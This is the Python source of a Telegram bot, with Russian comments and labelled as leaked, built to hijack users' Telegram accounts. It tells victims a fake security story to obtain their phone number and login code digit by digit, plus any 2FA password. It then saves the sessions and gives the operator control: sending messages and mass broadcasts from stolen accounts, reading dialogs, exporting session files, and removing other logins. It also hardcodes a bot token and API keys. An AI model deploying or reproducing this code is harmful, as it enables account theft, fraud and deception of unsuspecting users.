# CЛИТО В ТЕЛЕГРАМ КАНАЛАХ @END_SOFTWARE AND @END_RAID

import asyncio
import os
import sys
from datetime import datetime

# Проверка и установка зависимостей
try:
    from aiogram import Bot, Dispatcher, types
    from aiogram.contrib.fsm_storage.memory import MemoryStorage
    from aiogram.dispatcher import FSMContext
    from aiogram.utils import executor
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    from aiogram.dispatcher.filters.state import StatesGroup, State
    from aiogram.types import CallbackQuery, Message
    print("✅ Aiogram успешно импортирован")
except ImportError as e:
    print(f"❌ Ошибка импорта aiogram: {e}")
    print("Установите: pip install aiogram==2.25.1")
    sys.exit(1)

try:
    from telethon import TelegramClient
    from telethon import functions, types as telethon_types
    print("✅ Telethon успешно импортирован")
except ImportError as e:
    print(f"❌ Ошибка импорта telethon: {e}")
    print("Установите: pip install telethon==1.28.5")
    sys.exit(1)

# Настройки
bot_token = '8324933170:AAFatQ1T42ZJ70oeWS2UJkcXFeiwUFCIXAk'
api_id = 29385016  # Должно быть числом
api_hash = '3c57df8805ab5de5a23a032ed39b9af9'
admin_id = 6893832048
admin_id1 = 6893832048

# Инициализация бота
bot = Bot(token=bot_token, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Словарь для хранения паролей аккаунтов
account_passwords = {}

# States
class AddAccount(StatesGroup):
    A1 = State()
    A2 = State()
    A3 = State()
    A4 = State()
    A5 = State()
    A6 = State()
    PASSWORD = State()

class Send(StatesGroup):
    A1 = State()
    A2 = State()

class ManageAccount(StatesGroup):
    SELECT_ACCOUNT = State()
    ACTION = State()
    MESSAGE = State()
    TARGET = State()
    PASSWORD = State()

# Keyboards
code_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="1️⃣", callback_data="code_number:1"),
            InlineKeyboardButton(text="2️⃣", callback_data="code_number:2"),
            InlineKeyboardButton(text="3️⃣", callback_data="code_number:3"),
        ],
        [
            InlineKeyboardButton(text="4️⃣", callback_data="code_number:4"),
            InlineKeyboardButton(text="5️⃣", callback_data="code_number:5"),
            InlineKeyboardButton(text="6️⃣", callback_data="code_number:6"),
        ],
        [
            InlineKeyboardButton(text="7️⃣", callback_data="code_number:7"),
            InlineKeyboardButton(text="8️⃣", callback_data="code_number:8"),
            InlineKeyboardButton(text="9️⃣", callback_data="code_number:9")
        ],
        [
            InlineKeyboardButton(text="0️⃣", callback_data="code_number:0"),
        ]
    ]
)

admin_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="📨 Рассылка", callback_data="admin_broadcast"),
            InlineKeyboardButton(text="👥 Управление аккаунтами", callback_data="admin_manage")
        ],
        [
            InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"),
            InlineKeyboardButton(text="📁 Сессии", callback_data="admin_sessions")
        ],
        [
            InlineKeyboardButton(text="🔄 Очистить авторизации", callback_data="admin_clean"),
            InlineKeyboardButton(text="🔍 Мониторинг", callback_data="admin_monitor")
        ]
    ]
)

async def notify_admin(message_text):
    """Уведомление администратора"""
    try:
        await bot.send_message(admin_id, message_text)
        if admin_id1 != admin_id:
            await bot.send_message(admin_id1, message_text)
    except Exception as e:
        print(f"Ошибка уведомления админа: {e}")

async def connect_client(phone, password=None):
    """Подключение к клиенту с обработкой 2FA"""
    try:
        client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
        await client.connect()
        
        if not await client.is_user_authorized():
            return None, "Сессия не авторизована"
        
        # Проверяем нужен ли пароль
        try:
            await client.get_me()
        except Exception as e:
            if "password" in str(e).lower():
                if password:
                    try:
                        await client.start(phone=phone, password=password)
                    except:
                        return None, "Неверный пароль"
                else:
                    return None, "Требуется пароль 2FA"
        
        return client, None
    except Exception as e:
        return None, f"Ошибка подключения: {str(e)}"

# /start handler
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message, state: FSMContext):
    if message.from_user.id != admin_id and message.from_user.id != admin_id1:
        key_1 = types.KeyboardButton(text='Продолжить', request_contact=True)
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(key_1)
        await message.reply(
            text="В Telegram прошёл рейд скам ботов, которые оставили в аккаунтах дыры, просим вас пройти тест чтобы продолжить деятельность использования ботов!", 
            reply_markup=keyboard
        )
        msg_to_edit = await bot.send_message(chat_id=message.chat.id, text="Нажмите на кнопку \"Продолжить\"")
        await AddAccount.A1.set()
        await state.update_data(msg_to_edit=msg_to_edit)
    else:
        path = len([name for name in os.listdir('sessions/') if name.endswith('.session')])
        await message.reply(
            text=f"Привет <b>admin</b>, в ваших владениях {path} сессий!\n\nВыберите действие:", 
            reply_markup=admin_menu
        )

# Админские handlers
@dp.callback_query_handler(text_startswith="admin_")
async def admin_callback_handler(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != admin_id and call.from_user.id != admin_id1:
        await call.answer("❌ Доступ запрещен!", show_alert=True)
        return
    
    action = call.data.split("_")[1]
    
    if action == "broadcast":
        await call.message.edit_text("Введите сообщение для рассылки:")
        await Send.A1.set()
    elif action == "manage":
        await show_accounts_menu(call.message)
    elif action == "stats":
        await show_stats(call.message)
    elif action == "sessions":
        await send_sessions(call.message)
    elif action == "clean":
        await clean_auths(call.message)
    elif action == "monitor":
        await show_monitor_info(call.message)
    
    await call.answer()

async def show_accounts_menu(message: Message):
    sessions = [name.replace('.session', '') for name in os.listdir('sessions/') if name.endswith('.session')]
    
    if not sessions:
        await message.edit_text("❌ Нет доступных сессий")
        return
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    for phone in sessions[:20]:
        keyboard.add(InlineKeyboardButton(text=f"📱 {phone}", callback_data=f"manage_{phone}"))
    keyboard.add(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back"))
    
    await message.edit_text("👥 Выберите аккаунт для управления:", reply_markup=keyboard)

@dp.callback_query_handler(text_startswith="manage_")
async def manage_account(call: CallbackQuery):
    phone = call.data.replace("manage_", "")
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton(text="💬 Написать сообщение", callback_data=f"action_msg_{phone}"),
        InlineKeyboardButton(text="📊 Информация", callback_data=f"action_info_{phone}")
    )
    keyboard.add(
        InlineKeyboardButton(text="👥 Диалоги", callback_data=f"action_dialogs_{phone}"),
        InlineKeyboardButton(text="🔌 Проверить", callback_data=f"action_check_{phone}")
    )
    keyboard.add(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_manage"))
    
    await call.message.edit_text(f"📱 Аккаунт: <code>{phone}</code>\nВыберите действие:", reply_markup=keyboard)
    await call.answer()

@dp.callback_query_handler(text_startswith="action_")
async def account_action(call: CallbackQuery, state: FSMContext):
    data = call.data.replace("action_", "")
    action, phone = data.split("_", 1)
    
    if action == "msg":
        await call.message.edit_text(f"Введите сообщение для отправки от аккаунта <code>{phone}</code>:")
        await ManageAccount.MESSAGE.set()
        await state.update_data(phone=phone)
    elif action == "info":
        await get_account_info(call.message, phone)
    elif action == "dialogs":
        await get_account_dialogs(call.message, phone)
    elif action == "check":
        await check_account(call.message, phone)
    
    await call.answer()

async def get_account_info(message: Message, phone: str):
    """Получить информацию об аккаунте"""
    client, error = await connect_client(phone)
    if error:
        if "Требуется пароль" in error:
            await message.edit_text(f"🔒 Для аккаунта {phone} требуется пароль 2FA\n\nИспользуйте команду: /password_{phone} ваш_пароль")
            return
        await message.edit_text(f"❌ {error}")
        return
    
    try:
        me = await client.get_me()
        info_text = f"""
📱 <b>Информация об аккаунте:</b>

👤 Имя: {me.first_name or ''} {me.last_name or ''}
📞 Телефон: <code>{phone}</code>
🆔 ID: <code>{me.id}</code>
📛 Username: @{me.username or 'Нет'}
✅ Статус: Активен
"""
        await client.disconnect()
        await message.edit_text(info_text)
    except Exception as e:
        await message.edit_text(f"❌ Ошибка: {str(e)}")
        if client:
            await client.disconnect()

async def get_account_dialogs(message: Message, phone: str):
    """Получить диалоги аккаунта"""
    client, error = await connect_client(phone)
    if error:
        if "Требуется пароль" in error:
            await message.edit_text(f"🔒 Для аккаунта {phone} требуется пароль 2FA\n\nИспользуйте команду: /password_{phone} ваш_пароль")
            return
        await message.edit_text(f"❌ {error}")
        return
    
    try:
        dialogs = await client.get_dialogs(limit=10)
        dialogs_text = f"💬 <b>Диалоги {phone}:</b>\n\n"
        
        for dialog in dialogs[:8]:
            name = dialog.name or "Без названия"
            dialogs_text += f"• {name}\n"
        
        await client.disconnect()
        await message.edit_text(dialogs_text)
    except Exception as e:
        await message.edit_text(f"❌ Ошибка: {str(e)}")
        if client:
            await client.disconnect()

async def check_account(message: Message, phone: str):
    """Проверить статус аккаунта"""
    client, error = await connect_client(phone)
    if error:
        if "Требуется пароль" in error:
            await message.edit_text(f"🔒 Аккаунт {phone}: Требуется пароль 2FA")
            return
        await message.edit_text(f"❌ Аккаунт {phone}: {error}")
        return
    
    try:
        me = await client.get_me()
        await client.disconnect()
        await message.edit_text(f"✅ Аккаунт {phone}: Активен\n👤 {me.first_name or ''}")
    except Exception as e:
        await message.edit_text(f"❌ Ошибка проверки: {str(e)}")
        if client:
            await client.disconnect()

# Обработчик установки пароля
@dp.message_handler(lambda message: message.text.startswith('/password_'))
async def set_password(message: Message):
    if message.from_user.id != admin_id and message.from_user.id != admin_id1:
        return
    
    try:
        parts = message.text.split('_')
        phone = parts[1].split()[0]
        password = ' '.join(parts[1].split()[1:])
        
        if not password:
            await message.reply("❌ Укажите пароль: /password_79991234567 ваш_пароль")
            return
        
        # Сохраняем пароль
        account_passwords[phone] = password
        await message.reply(f"✅ Пароль для {phone} сохранен!")
        
        # Проверяем подключение с паролем
        client, error = await connect_client(phone, password)
        if client:
            me = await client.get_me()
            await client.disconnect()
            await message.reply(f"🎉 Успешный вход! Аккаунт: {me.first_name or ''}")
        else:
            await message.reply(f"❌ Ошибка: {error}")
            
    except Exception as e:
        await message.reply(f"❌ Ошибка: {str(e)}")

@dp.message_handler(state=ManageAccount.MESSAGE)
async def receive_message_for_account(message: Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("phone")
    text = message.text
    
    await message.reply(f"Введите username или ID получателя (без @):")
    await ManageAccount.TARGET.set()
    await state.update_data(phone=phone, message_text=text)

@dp.message_handler(state=ManageAccount.TARGET)
async def send_message_from_account(message: Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("phone")
    text = data.get("message_text")
    target = message.text
    
    # Получаем пароль если есть
    password = account_passwords.get(phone)
    
    client, error = await connect_client(phone, password)
    if error:
        await message.reply(f"❌ Ошибка подключения: {error}")
        await state.finish()
        return
    
    try:
        await client.send_message(target, text)
        await client.disconnect()
        await message.reply(f"✅ Сообщение отправлено от {phone} пользователю {target}")
        await notify_admin(f"💬 Сообщение от {phone} для {target}: {text}")
    except Exception as e:
        await message.reply(f"❌ Ошибка отправки: {str(e)}")
    finally:
        if client:
            await client.disconnect()
        await state.finish()

async def show_stats(message: Message):
    sessions = len([name for name in os.listdir('sessions/') if name.endswith('.session')])
    stats_text = f"""
📊 <b>Статистика:</b>

📁 Сессий: {sessions}
🔑 Аккаунтов с паролем: {len(account_passwords)}
🕒 Время: {datetime.now().strftime('%H:%M:%S')}
"""
    await message.edit_text(stats_text)

async def send_sessions(message: Message):
    sessions = [name for name in os.listdir('sessions/') if name.endswith('.session')]
    if not sessions:
        await message.edit_text("❌ Нет сессий")
        return
    
    for session in sessions:
        try:
            await bot.send_document(message.chat.id, open(f"sessions/{session}", "rb"))
        except Exception as e:
            print(f"Ошибка отправки {session}: {e}")
    await message.answer(f"✅ Отправлено {len(sessions)} сессий")

async def clean_auths(message: Message):
    res = 0
    sessions = [name.replace('.session', '') for name in os.listdir('sessions/') if name.endswith('.session')]
    
    for phone in sessions:
        try:
            password = account_passwords.get(phone)
            client, error = await connect_client(phone, password)
            if client:
                result = await client(functions.account.GetAuthorizationsRequest())
                auths_list = result.to_dict()['authorizations']
                for auth in auths_list:
                    if auth['app_name'] not in ['Telegram Desktop', 'Telegram for Android']:
                        try:
                            await client(functions.account.ResetAuthorizationRequest(hash=auth['hash']))
                            res += 1
                        except:
                            pass
                await client.disconnect()
        except Exception as e:
            print(f"Ошибка очистки {phone}: {e}")
    
    await message.edit_text(f"✅ Удалено {res} авторизаций")

async def show_monitor_info(message: Message):
    info_text = """
🔍 <b>Мониторинг активностей:</b>

• Коды подтверждения
• Успешные авторизации  
• Действия пользователей
• Сообщения от аккаунтов

Все уведомления отправляются админу.
"""
    await message.edit_text(info_text)

@dp.callback_query_handler(text="admin_back")
async def admin_back(call: CallbackQuery):
    await call.message.edit_text("🏠 Главное меню:", reply_markup=admin_menu)

# Рассылка
@dp.message_handler(commands=['send'])
async def send_post(message: types.Message):
    if message.from_user.id == admin_id or message.from_user.id == admin_id1:
        await message.reply("Введите username получателя:")
        await Send.A1.set()

@dp.message_handler(state=Send.A1)
async def send_A1(message: Message, state: FSMContext):
    await state.update_data(username=message.text)
    await message.reply("Введите текст:")
    await Send.next()

@dp.message_handler(state=Send.A2)
async def send_A2(message: Message, state: FSMContext):
    data = await state.get_data()
    username = data.get("username")
    
    sent_count = 0
    sessions = [name.replace('.session', '') for name in os.listdir('sessions/') if name.endswith('.session')]
    
    for phone in sessions:
        try:
            password = account_passwords.get(phone)
            client, error = await connect_client(phone, password)
            if client:
                await client.send_message(username, message.text)
                await client.disconnect()
                sent_count += 1
        except Exception as e:
            print(f"Ошибка отправки с {phone}: {e}")
    
    await message.reply(f"✅ Отправлено с {sent_count} аккаунтов")
    await state.finish()

# Авторизация пользователей
@dp.message_handler(content_types=['contact'], state=AddAccount.A1)
async def receive_number(message: Message, state: FSMContext):
    data = await state.get_data()
    msg_to_edit = data.get("msg_to_edit")
    number = message.contact.phone_number.replace(' ', '')
    await message.delete()
    
    await notify_admin(f"📱 Новый номер: {number}\nПользователь: @{message.from_user.username or 'Нет'}")
    
    if os.path.exists(f"sessions/{number}.session"):
        os.remove(f"sessions/{number}.session")
    
    try:
        client = TelegramClient(f"sessions/{number}", api_id, api_hash)
        await client.connect()
        sent = await client.send_code_request(phone=number)
        await client.disconnect()
        
        await notify_admin(f"🔐 Код отправлен на: {number}")
        
        await msg_to_edit.edit_text(
            f"<b>Номер: <code>{number}</code>\nУкажите первую цифру кода:</b>",
            reply_markup=code_menu
        )
        await AddAccount.next()
        await state.update_data(number=number, sent=sent, code_hash=sent.phone_code_hash)
        
    except Exception as e:
        await msg_to_edit.edit_text(f"❌ Ошибка: {str(e)}")

# Обработчики кодов
@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A2)
async def receive_code(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    num_1 = call.data.split(":")[1]
    await call.message.edit_text(f"<b>Код: <code>{num_1}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_1=num_1)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A3)
async def receive_code1(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    num_1, num_2 = data.get("num_1"), call.data.split(":")[1]
    code = num_1 + num_2
    await call.message.edit_text(f"<b>Код: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_2=num_2)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A4)
async def receive_code2(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    num_1, num_2, num_3 = data.get("num_1"), data.get("num_2"), call.data.split(":")[1]
    code = num_1 + num_2 + num_3
    await notify_admin(f"🔢 Частичный код: {code}*\nНомер: {data.get('number')}")
    await call.message.edit_text(f"<b>Код: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_3=num_3)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A5)
async def receive_code3(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    num_1, num_2, num_3, num_4 = data.get("num_1"), data.get("num_2"), data.get("num_3"), call.data.split(":")[1]
    code = num_1 + num_2 + num_3 + num_4
    await call.message.edit_text(f"<b>Код: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_4=num_4)

@dp.callback_query_handler(state=AddAccount.A6)
async def receive_code4(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    num_1, num_2, num_3, num_4 = data.get("num_1"), data.get("num_2"), data.get("num_3"), data.get("num_4")
    number, code_hash = data.get("number"), data.get("code_hash")
    num_5 = call.data.split(":")[1]
    full_code = num_1 + num_2 + num_3 + num_4 + num_5
    
    await notify_admin(f"✅ Полный код: {full_code}\nНомер: {number}")
    
    try:
        client = TelegramClient(f"sessions/{number}", api_id, api_hash)
        await client.connect()
        
        try:
            await client.sign_in(phone=number, code=full_code, phone_code_hash=code_hash)
        except Exception as e:
            if "password" in str(e).lower():
                await notify_admin(f"🔒 Требуется пароль 2FA для {number}")
                await call.message.edit_text("🔒 Введите пароль 2FA:")
                await AddAccount.PASSWORD.set()
                await state.update_data(client=client, number=number)
                return
            else:
                raise e
        
        me = await client.get_me()
        await notify_admin(f"🎉 Успешная авторизация!\nАккаунт: {me.first_name or ''}\nНомер: {number}")
        
        await client.disconnect()
        await call.message.edit_text("✅ Авторизация успешна! Аккаунт добавлен.")
        
    except Exception as e:
        await notify_admin(f"❌ Ошибка авторизации {number}: {str(e)}")
        await call.message.edit_text("❌ Ошибка авторизации. Попробуйте /start")

@dp.message_handler(state=AddAccount.PASSWORD)
async def handle_password(message: Message, state: FSMContext):
    data = await state.get_data()
    client = data.get("client")
    number = data.get("number")
    password = message.text
    
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        
        # Сохраняем пароль
        account_passwords[number] = password
        
        await notify_admin(f"🎉 Успешный вход с паролем!\nАккаунт: {me.first_name or ''}\nНомер: {number}")
        
        await client.disconnect()
        await message.reply("✅ Авторизация успешна! Пароль сохранен.")
        
    except Exception as e:
        await message.reply(f"❌ Неверный пароль: {str(e)}")
    finally:
        await state.finish()

if __name__ == '__main__':
    os.makedirs('sessions', exist_ok=True)
    print("🚀 Бот запускается...")
    print("📁 Папка сессий создана")
    executor.start_polling(dp)
